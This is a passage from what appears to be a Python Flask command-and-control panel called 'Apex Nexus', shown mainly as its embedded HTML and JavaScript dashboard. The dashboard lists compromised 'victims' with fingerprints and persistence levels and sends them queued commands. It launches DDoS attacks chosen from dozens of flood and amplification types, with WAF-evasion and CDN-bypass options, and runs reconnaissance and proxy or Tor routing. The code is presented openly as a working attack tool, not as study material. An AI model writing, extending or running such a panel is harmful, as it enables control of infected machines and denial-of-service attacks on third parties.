  text-align:left;cursor:pointer;font-size:.9rem}
.nav.on{background:rgba(255,59,59,.08);color:var(--acc);border-left:3px solid var(--acc)}
.main{padding:18px;overflow-y:auto}
.panel{background:var(--pnl);border:1px solid var(--brd);border-radius:8px;
  padding:16px;margin-bottom:16px}
.sec{color:var(--acc);font-size:1.1rem;letter-spacing:1px;margin:0 0 12px 0;
  display:flex;align-items:center;gap:10px}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(360px,1fr));gap:12px}
.card{background:#121212;border:1px solid var(--brd);border-radius:8px;padding:14px}
.card-hd{display:flex;justify-content:space-between;align-items:center;
  margin-bottom:8px;font-size:.85rem}
.dot{width:9px;height:9px;border-radius:50%;background:var(--grn);
  box-shadow:0 0 8px rgba(57,211,83,.8);display:inline-block}
.row{display:flex;justify-content:space-between;font-size:.78rem;color:var(--mut);
  padding:3px 0}
.tag{background:rgba(255,59,59,.1);border:1px solid var(--acc);color:var(--acc);
  border-radius:4px;padding:1px 6px;font-size:.7rem}
.tag.spec{background:rgba(255,138,138,.12);border-color:var(--acc2);color:var(--acc2)}
.cmdbox{background:var(--acc-dim);border:1px solid var(--acc);border-radius:6px;
  padding:10px;margin-top:10px}
.cmdbox label{display:block;font-size:.72rem;color:var(--acc);
  letter-spacing:1px;margin-bottom:6px;font-weight:bold}
select,input,button{font-family:monospace;font-size:.85rem}
select.cmd{width:100%;padding:9px;background:#060606;border:1px solid var(--brd);
  color:var(--txt);border-radius:6px;margin-bottom:6px}
input.cmdpayload{width:100%;padding:7px;background:#060606;border:1px solid var(--brd);
  color:var(--txt);border-radius:6px;font-size:.78rem;margin-bottom:6px}
button{padding:7px 10px;background:#1d1d1d;border:1px solid var(--brd);
  color:var(--txt);border-radius:6px;cursor:pointer}
button.prim{background:var(--acc);border-color:var(--acc);color:#fff;font-weight:bold}
button.send{background:var(--acc2);border-color:var(--acc2);color:#0a0a0a;
  font-weight:bold;width:100%}
button.dang{background:#2a1010;border-color:#9b2a2a;color:#ff8a8a}
button:disabled{opacity:.5;cursor:not-allowed}
.acts{display:flex;gap:6px;flex-wrap:wrap;margin-top:8px}
.row2{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:10px}
.row2 label{font-size:.72rem;color:var(--mut)}
.row2 input,.row2 select{width:100%;padding:9px;background:#0d0d0d;
  border:1px solid var(--brd);color:var(--txt);border-radius:6px}
.chk{display:flex;align-items:center;gap:6px;font-size:.78rem;color:var(--mut);
  margin-top:6px}
.right{background:#050505;border-left:1px solid var(--brd);padding:12px;overflow-y:auto}
.log{border-left:3px solid var(--acc);padding-left:8px;margin-bottom:6px;
  font-size:.78rem;color:#c7c7c7;white-space:pre-wrap;word-break:break-word}
.atk{display:flex;justify-content:space-between;align-items:center;padding:9px;
  border-bottom:1px solid var(--brd);font-size:.78rem;gap:8px}
.detail{background:#0d0d0d;border:1px solid var(--brd);border-radius:6px;padding:12px;
  white-space:pre-wrap;font-size:.75rem;color:var(--acc2);max-height:420px;
  overflow-y:auto}
.mut{color:var(--mut)}
.omni-row{display:flex;gap:8px;align-items:flex-start;padding:6px 0;
  border-bottom:1px solid var(--brd);font-size:.78rem}
.omni-n{color:var(--acc);font-weight:bold;min-width:26px}
.omni-v{color:var(--acc2);min-width:190px}
.omni-d{color:var(--mut);flex:1}
.omni-r{color:var(--acc);margin-left:auto;font-size:.72rem}
</style></head><body>
<header>
 <div class="brand">NUCLEAR / C2</div>
 <div class="stat">
  <div>VICTIMS <span class="pill" id="victim-count">0</span></div>
  <a href="#" class="attk-link" onclick="showTab('ddos');return false;">
    <div>ACTIVE ATTACKS <span class="pill" id="attack-count">0</span></div>
  </a>
  <div>LOGS <span class="pill" id="log-count">0</span></div>
 </div>
</header>

<div class="cont">
 <aside class="sb">
  <button class="nav on" onclick="showTab('dashboard')">DASHBOARD</button>
  <button class="nav"    onclick="showTab('victims')">VICTIMS</button>
  <button class="nav"    onclick="showTab('ddos')">DDoS / ATTACKS</button>
  <button class="nav"    onclick="showTab('omni')">OMNI-VECTOR ORDER</button>
  <button class="nav"    onclick="showTab('recon')">RECON</button>
  <button class="nav"    onclick="showTab('settings')">SETTINGS</button>
  <a href="/logout" style="display:block;color:var(--mut);padding:14px 18px;
     text-decoration:none">LOGOUT</a>
 </aside>

 <main class="main">
  <div id="dashboard" class="tab">
   <div class="panel">
    <h2 class="sec">Live Victims &mdash; per-client command console
      <span class="mut" style="font-size:.75rem">(&#9733; = OS-specific)</span>
    </h2>
    <div id="victim-list" class="grid"></div>
   </div>
  </div>

  <div id="victims" class="tab" style="display:none">
   <div class="panel">
    <h2 class="sec">All Victims</h2>
    <div id="all-victim-list" class="grid"></div>
   </div>
   <div class="panel">
    <h2 class="sec">Victim Detail &amp; Command History</h2>
    <div id="victim-details" class="detail">Select <b>INFO</b> on a victim.</div>
   </div>
  </div>

  <div id="ddos" class="tab" style="display:none">
   <div class="panel">
    <h2 class="sec">DDoS Control</h2>
    <div class="row2">
     <div><label>Target URL</label>
      <input id="ddos-target" placeholder="https://example.com"></div>
     <div><label>Attack Type</label>
      <select id="ddos-type">
       <option value="omni_sequential">&#9733; OMNI-SEQUENTIAL (escalation ladder)</option>
       <option value="omni_vector">&#9733; OMNI-VECTOR (all simultaneously)</option>
       <option value="http_flood">HTTP Flood</option>
       <option value="http_get_post_flood">HTTP GET POST Flood</option>
       <option value="syn_flood">SYN Flood</option>
       <option value="udp_flood">UDP Flood</option>
       <option value="icmp_flood">ICMP Flood</option>
       <option value="dns_query_flood">DNS Query Flood</option>
       <option value="dns_water_torture">DNS Water Torture</option>
       <option value="ntp_amplification">NTP Amplification</option>
       <option value="memcached_amplification">Memcached Amplification</option>
       <option value="ssdp_upnp_amplification">SSDP / UPnP Amplification</option>
       <option value="snmp_amplification">SNMP Amplification</option>
       <option value="chargen_flood">Chargen Flood</option>
       <option value="reflection_amplification">Reflection Amplification</option>
       <option value="volumetric_amplification">Volumetric Amplification</option>
       <option value="quic_exhaustion">QUIC Exhaustion</option>
       <option value="http3_multiplexed_datagram">HTTP/3 Multiplexed</option>
       <option value="http2_rapid_reset">HTTP/2 Rapid Reset</option>
       <option value="slowloris">Slowloris</option>
       <option value="slow_post_rudy">Slow POST (RUDY)</option>
       <option value="slow_read_attack">Slow Read</option>
       <option value="challenge_collapsar">Challenge Collapsar</option>
       <option value="zero_window_tcp">Zero-Window TCP</option>
       <option value="api_centric">API-Centric</option>
       <option value="llm_token_exhaustion">LLM Token Exhaustion</option>
       <option value="llm_prompt_bomb">LLM Prompt Bomb</option>
       <option value="tensorflow_protobuf_overflow">TensorFlow Protobuf Overflow</option>
       <option value="wasm_compilation_bomb">WASM Compilation Bomb</option>
       <option value="wasm_memory_bomb">WASM Memory Bomb</option>
       <option value="post_quantum_handshake">Post-Quantum Handshake</option>
       <option value="lattice_crypto_dos">Lattice Crypto DoS</option>
       <option value="rpc_node_flood">RPC Node Flood</option>
       <option value="smart_contract_gas_bomb">Smart Contract Gas Bomb</option>
       <option value="mev_mempool_spam">MEV Mempool Spam</option>
       <option value="edge_function_chain">Edge Function Chain</option>
       <option value="geo_distributed_edge">Geo-Distributed Edge</option>
       <option value="hybrid_multi_vector">Hybrid Multi-Vector</option>
       <option value="carpet_bombing">Carpet Bombing</option>
       <option value="adaptive_ai">Adaptive AI</option>
       <option value="autonomous_p2p_swarm">Autonomous P2P Swarm</option>
       <option value="advanced_persistent_dos">Advanced Persistent DoS</option>
       <option value="yo_yo_attack">Yo-Yo Attack</option>
       <option value="protocol_state_exhaustion">Protocol State Exhaustion</option>
       <option value="mptcp_flood">MPTCP Flood</option>
       <option value="sack_panic">SACK Panic</option>
       <option value="tcp_ack_fin_rst_flood">TCP ACK/FIN/RST Flood</option>
       <option value="websocket_sse_state_flood">WebSocket / SSE State Flood</option>
       <option value="application_layer_starvation">App-Layer Starvation</option>
       <option value="dynamic_cache_line_thrashing">Cache-Line Thrashing</option>
       <option value="semantic_logic_bomb">Semantic Logic Bomb</option>
       <option value="ssti_concurrency">SSTI Concurrency</option>
       <option value="serverless_snowball">Serverless Snowball</option>
       <option value="supply_chain_choke">Supply Chain Choke</option>
       <option value="adversarial_ml_mimicry">Adversarial ML Mimicry</option>
       <option value="ai_human_mimic">AI Human-Mimic</option>
       <option value="cross_tenant_cloud">Cross-Tenant Cloud</option>
       <option value="cost_based_ddos">Cost-Based DDoS</option>
       <option value="search_engine_abuse">Search-Engine Abuse</option>
       <option value="login_brute_force">Login Brute Force</option>
      </select></div>
    </div>
    <div class="row2">
     <div><label>Duration (sec)</label>
      <input id="ddos-duration" type="number" value="120"></div>
     <div><label>Workers (threads)</label>
      <input id="ddos-threads" type="number" value="60"></div>
    </div>
    <div class="row2">
     <div><label>Origin IP (CDN bypass)</label>
      <input id="ddos-origin" placeholder="optional: 203.0.113.42"></div>
     <div><label>Port (optional)</label>
      <input id="ddos-port" type="number" placeholder="default 80/443"></div>
    </div>
    <label class="chk"><input type="checkbox" id="ddos-adaptive" checked>
      Adaptive rate control (monitor RTT / errors, auto-adjust)</label>
    <label class="chk"><input type="checkbox" id="ddos-waf" checked>
      WAF evasion (weird verbs, X-Forwarded-For, X-HTTP-Method-Override)</label>
    <label class="chk"><input type="checkbox" id="ddos-cdn" checked>
      CDN bypass (Host header + origin IP when set)</label>
    <button class="prim" onclick="startDDoS()"
     style="width:100%;padding:12px;margin-top:12px">LAUNCH</button>
   </div>

   <div class="panel">
    <h2 class="sec">Active / Recent Attacks
      <button id="refresh-btn" class="prim"
       style="padding:4px 10px;font-size:.75rem"
       onclick="renderAttacks(true)">REFRESH</button>
    </h2>
    <div id="attack-list"></div>
   </div>
  </div>

  <div id="omni" class="tab" style="display:none">
   <div class="panel">
    <h2 class="sec">Omni-vector escalation ladder
      <span class="mut" style="font-size:.75rem">
        (lightest &rarr; heaviest &mdash; the order omni_sequential uses)</span>
    </h2>
    <div id="omni-list">loading&hellip;</div>
   </div>
  </div>

  <div id="recon" class="tab" style="display:none">
   <div class="panel">
    <h2 class="sec">Reconnaissance</h2>
    <div class="row2">
     <div><label>Target Domain / IP</label>
      <input id="recon-target" placeholder="example.com"></div>
     <div><label>Tool</label>
      <select id="recon-tool">
       <option value="subdomains">Subdomain Enumeration</option>
       <option value="portscan">Port Scan</option>
       <option value="origin">Origin IP Locator</option>
       <option value="vulnscan">Vulnerability Scan</option>
      </select></div>
    </div>
    <button class="prim" onclick="runRecon()"
     style="width:100%;margin-top:10px">RUN RECON</button>
    <div id="recon-results"
     style="margin-top:16px;white-space:pre-wrap;font-size:.8rem"></div>
   </div>
  </div>

  <div id="settings" class="tab" style="display:none">
   <div class="panel">
    <h2 class="sec">Proxy Pool</h2>
    <div id="proxy-info" class="detail">loading&hellip;</div>
   </div>
   <div class="panel">
    <h2 class="sec">Notes</h2>
    <div style="font-size:.82rem;color:var(--mut);line-height:1.6">
     Set <code>NEXUS_PROXIES</code> env var to a comma-separated list:
     <code>http://user:pass@host:3128,socks5://127.0.0.1:9050</code>.
     For Tor, install <code>pip install pysocks</code> and point to a
     running Tor SOCKS5 listener.
    </div>
   </div>
  </div>
 </main>

 <aside class="right">
  <div style="display:flex;justify-content:space-between;align-items:center">
   <h3 class="sec" style="font-size:.9rem;margin:0 0 8px 0">Activity Log</h3>
   <button class="dang" style="padding:4px 8px;font-size:.7rem"
    onclick="clearLogs()">CLEAR LOGS</button>
  </div>
  <div id="live-log"></div>
 </aside>
</div>

<script>
// ---------- Utilities ----------
function esc(s) {
  const d = document.createElement('span');
  d.textContent = s == null ? '' : s;
  return d.innerHTML;
}

function showTab(n) {
  document.querySelectorAll('.tab').forEach(e => e.style.display = 'none');
  const t = document.getElementById(n);
  if (t) t.style.display = 'block';
  document.querySelectorAll('.nav').forEach(b => b.classList.remove('on'));
  const btn = document.querySelector('button.nav[onclick="showTab(\\'' + n + '\\')"]');
  if (btn) btn.classList.add('on');
}

// ---------- Victim rendering (diff-based, dropdowns stay open) ----------
const _dashCards = new Map();  // vid -> {node, sig}
const _allCards  = new Map();

function victimSignature(v) {
  const rt = v.runtime || {};
  return [
    v.id,
    v.ip_address || '',
    rt.os || '',
    rt.browser || '',
    rt.device || '',
    (v.command_catalog || []).length
  ].join('|');
}

function cardHTML(v) {
  const rt = v.runtime || {};
  const cmds = v.command_catalog || [];
  let opts = '<option value="">— select command (' + cmds.length + ' available) —</option>';
  for (const c of cmds) {
    opts += '<option value="' + esc(c.type) + '">' +
            esc(c.label) + (c.os_specific ? ' ★' : '') + '</option>';
  }
  return `
   <div class="card-hd">
    <span>${esc(v.id)}</span>
    <span style="display:flex;gap:6px;align-items:center">
     <span class="tag">${esc(rt.os || '?')}</span>
     <span class="dot"></span>
    </span>
   </div>
   <div class="row"><span>IP</span><span>${esc(v.ip_address || '?')}</span></div>
   <div class="row"><span>Browser</span><span>${esc(rt.browser || '?')}</span></div>
   <div class="row"><span>Device</span><span>${esc(rt.device || '?')}</span></div>
   <div class="row"><span>Last seen</span><span data-lastseen>${
     v.last_seen ? new Date(v.last_seen).toLocaleString() : '?'}</span></div>

   <div class="cmdbox">
    <label>COMMAND (${cmds.length} valid for ${esc(rt.os || '?')})</label>
    <select class="cmd" id="cmd-${esc(v.id)}">${opts}</select>
    <input class="cmdpayload" id="cmdpayload-${esc(v.id)}"
      placeholder="payload (optional)">
    <button class="send" onclick="sendSelected('${esc(v.id)}', this)">
      SEND COMMAND
    </button>
   </div>
   <div class="acts">
    <button class="prim" onclick="showVictimDetail('${v.id}')">INFO</button>
    <button class="dang" onclick="removeVictim('${v.id}')">DELETE</button>
   </div>`;
}

function diffRender(container, vs, map) {
  if (!container) return;
  const seen = new Set();

  for (const v of vs) {
    seen.add(v.id);
    const sig = victimSignature(v);
    const entry = map.get(v.id);

    if (entry && entry.sig === sig && entry.node.parentNode === container) {
      // Patch just the last-seen field in place; DOM stays intact so an
      // open dropdown / typed payload is preserved across polls.
      const ls = entry.node.querySelector('[data-lastseen]');
      if (ls) ls.textContent =
        v.last_seen ? new Date(v.last_seen).toLocaleString() : '?';
      continue;
    }

    // Rebuild this one card
    const node = document.createElement('div');
    node.className = 'card';
    node.innerHTML = cardHTML(v);

    if (entry && entry.node.parentNode) {
      entry.node.parentNode.replaceChild(node, entry.node);
    } else {
      container.appendChild(node);
    }
    map.set(v.id, { node: node, sig: sig });
  }

  // Prune removed victims
  for (const [id, entry] of Array.from(map.entries())) {
    if (!seen.has(id)) {
      if (entry.node.parentNode) entry.node.parentNode.removeChild(entry.node);
      map.delete(id);
    }
  }
}

function renderVictims(vs) {
  diffRender(document.getElementById('victim-list'),     vs, _dashCards);
  diffRender(document.getElementById('all-victim-list'), vs, _allCards);
  const c = document.getElementById('victim-count');
  if (c) c.textContent = vs.length;
}

// ---------- Commands ----------
function sendSelected(vid, btn) {
  const sel = document.getElementById('cmd-' + vid);
  const pl  = document.getElementById('cmdpayload-' + vid);
  if (!sel || !sel.value) {
    addLog('pick a command for ' + vid + ' first');
    return;
  }
  const orig = btn.textContent;
  btn.disabled = true;
  btn.textContent = 'SENDING…';
  sendCommand(vid, sel.value, pl ? pl.value : '')
    .finally(function() {
      btn.disabled = false;
      btn.textContent = orig;
    });
}

function sendCommand(vid, ctype, payload) {
  return fetch('/api/send_command', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      victim_id: vid, command_type: ctype, payload: payload || ''
    })
  })
  .then(function(r) { return r.json(); })
  .then(function(d) {
    if (d.status === 'queued') {
      addLog('QUEUED: ' + ctype + ' → ' + vid + ' (id=' + d.command_id + ')');
    } else {
      addLog('REJECTED (' + ctype + '): ' + (d.error || '?'));
    }
  })
  .catch(function(e) { addLog('SEND FAILED: ' + e.message); });
}

function showVictimDetail(vid) {
  fetch('/api/victim_detail/' + vid)
   .then(function(r) { return r.json(); })
   .then(function(d) {
    document.getElementById('victim-details').textContent =
      JSON.stringify({
        runtime: d.runtime,
        command_catalog: d.command_catalog,
        command_history: d.command_history,
        fingerprint: d.fingerprint,
        persistence_level: d.persistence_level,
        last_seen: d.last_seen
      }, null, 2);
    showTab('victims');
   })
   .catch(function(){});
}

function removeVictim(vid) {
  if (!confirm('Delete ' + vid + ' and cascaded commands/logs?')) return;
  fetch('/api/victims/' + vid, { method: 'DELETE' })
   .then(function(r) { return r.json(); })
   .then(function(d) {
    if (d.status === 'deleted') {
      addLog('DELETED ' + vid + ' (' + d.commands_deleted + ' cmds, ' +
             d.logs_deleted + ' logs)');
      loadData();
    } else {
      addLog('delete failed: ' + (d.error || '?'));
    }
   });
}

function clearLogs() {
  if (!confirm('Clear all activity logs?')) return;
  fetch('/api/logs/clear', { method: 'POST' })
   .then(function(r) { return r.json(); })
   .then(function(d) {
    addLog('Logs cleared (' + d.deleted + ' entries)');
    loadData();
   });
}

// ---------- Attacks ----------
function startDDoS() {
  const target = document.getElementById('ddos-target').value.trim();
  if (!target) { alert('enter target URL'); return; }
  const payload = {
    target:      target,
    attack_type: document.getElementById('ddos-type').value,
    duration:    Number(document.getElementById('ddos-duration').value || 60),
    threads:     Number(document.getElementById('ddos-threads').value || 50),
    origin_ip:   (document.getElementById('ddos-origin').value || '').trim() || null,
    port:        Number(document.getElementById('ddos-port').value) || null,
    adaptive:    document.getElementById('ddos-adaptive').checked,
    bypass_waf:  document.getElementById('ddos-waf').checked,
    bypass_cdn:  document.getElementById('ddos-cdn').checked
  };
  fetch('/api/start_attack', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  })
  .then(function(r) { return r.json(); })
  .then(function(d) {
    if (d.status === 'started') {
      addLog('LAUNCHED ' + d.attack_id + ' [' + payload.attack_type + ']');
    } else {
      addLog('launch failed: ' + (d.error || '?'));
    }
    renderAttacks(true);
  });
}

function stopAttack(aid) {
  fetch('/api/stop_attack/' + aid, { method: 'POST' })
   .then(function() { addLog('STOPPED ' + aid); renderAttacks(false); });
}

function renderAttacks(userInitiated) {
  const btn = document.getElementById('refresh-btn');
  if (userInitiated && btn) { btn.disabled = true; btn.textContent = 'REFRESHING…'; }

  fetch('/api/attacks')
   .then(function(r) { return r.json(); })
   .then(function(list) {
    const el = document.getElementById('attack-list');
    if (!el) return;

    if (!list.length) {
      el.innerHTML = '<div class="mut" style="padding:8px">' +
                     'No attacks yet — launch one above.</div>';
    } else {
      el.innerHTML = '';
      for (const a of list.slice(0, 20)) {
        const live   = a.live || {};
        const active = a.status === 'active' ||
                       (live.status && live.status === 'active');
        const line = (live.pps !== undefined)
          ? (live.status + ' | ' + live.pps + ' pps | ' +
             live.packets_sent + ' pkts | ' + live.errors + ' err | ' +
             live.remaining + 's left' +
             (live.phase_name ? ' | phase: ' + live.phase_name : ''))
          : a.status;
        const row = document.createElement('div');
        row.className = 'atk';
        row.innerHTML = `
         <span style="flex:1;min-width:0">
          <b>${esc(a.id)}</b><br>
          <span class="mut">${esc(a.target_url)} [${esc(a.attack_type)}]</span>
         </span>
         <span style="text-align:right;min-width:0">
          <span class="pill${active ? ' live' : ''}">${esc(line)}</span>
          ${active ? '<button class="dang" style="margin-left:6px" ' +
                    'onclick="stopAttack(\\'' + a.id + '\\')">STOP</button>' : ''}
         </span>`;
        el.appendChild(row);
      }
    }

    // Header count
    const activeCount = list.filter(function(x) { return x.status === 'active'; }).length;
    const cc = document.getElementById('attack-count');
    if (cc) {
      cc.textContent = activeCount;
      cc.classList.toggle('live', activeCount > 0);
    }

    if (userInitiated) {
      addLog('attacks refreshed (' + list.length + ' total, ' +
             activeCount + ' active)');
    }
   })
   .catch(function(e) {
    if (userInitiated) addLog('refresh failed: ' + e.message);
   })
   .finally(function() {
    if (userInitiated && btn) { btn.disabled = false; btn.textContent = 'REFRESH'; }
   });
}

// ---------- Omni ----------
function renderOmni() {
  fetch('/api/omni_order')
   .then(function(r) { return r.json(); })
   .then(function(list) {
    const el = document.getElementById('omni-list');
    if (!el) return;
    el.innerHTML = '';
    for (const o of list) {
      const row = document.createElement('div');
      row.className = 'omni-row';
      row.innerHTML = `
       <span class="omni-n">${o.step}</span>
       <span class="omni-v">${esc(o.vector)}</span>
       <span class="omni-d">${esc(o.description)}</span>
       <span class="omni-r">${o.profile_rate} pps/worker</span>`;
      el.appendChild(row);
    }
   });
}

// ---------- Proxies ----------
function renderProxies() {
  fetch('/api/proxies')
   .then(function(r) { return r.json(); })
   .then(function(d) {
    const el = document.getElementById('proxy-info');
    if (el) el.textContent = JSON.stringify(d, null, 2);
   });
}

// ---------- Recon ----------
function runRecon() {
  const tool = document.getElementById('recon-tool').value;
  const target = document.getElementById('recon-target').value.trim();
  if (!target) return;
  fetch('/api/recon/' + tool, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ target: target })
  })
  .then(function(r) { return r.json(); })
  .then(function(d) {
    document.getElementById('recon-results').textContent =
      JSON.stringify(d, null, 2);
    addLog('recon: ' + tool + ' → ' + target);
  });
}

// ---------- Log ----------
function addLog(msg) {
  const item = document.createElement('div');
  item.className = 'log';
  item.textContent = '[' + new Date().toISOString() + '] ' + msg;
  const feed = document.getElementById('live-log');
  if (feed) feed.prepend(item);
}

// ---------- Bulk load ----------
function loadData() {
  fetch('/api/victims')
   .then(function(r) { return r.json(); })
   .then(renderVictims);

  fetch('/api/logs')
   .then(function(r) { return r.json(); })
   .then(function(l) {
    const feed = document.getElementById('live-log');
    if (!feed) return;
    feed.innerHTML = '';
    for (const x of l) {
      const e = document.createElement('div');
      e.className = 'log';
      e.textContent = '[' + x.timestamp + '] [' + x.level + '] ' + x.message;
      feed.appendChild(e);
    }
    const c = document.getElementById('log-count');
    if (c) c.textContent = l.length;
   });

  renderAttacks(false);
  renderProxies();
}

// ---------- Init ----------
renderOmni();
loadData();
setInterval(loadData, 3000);
setInterval(function() { renderAttacks(false); }, 2000);
</script>
</body></html>
"""

# ======================================================================
# Entry point
# ======================================================================
if __name__ == "__main__":
    print("Apex Nexus")
    print("  Login:     http://localhost:5000/login")
    print("  Dashboard: http://localhost:5000/dashboard")
    print("  Client:    http://localhost:5000/client")
    print("  Proxy env: NEXUS_PROXIES='http://u:p@h:3128,socks5://127.0.0.1:9050'")
    app.run(host="0.0.0.0", port=5000, debug=False)
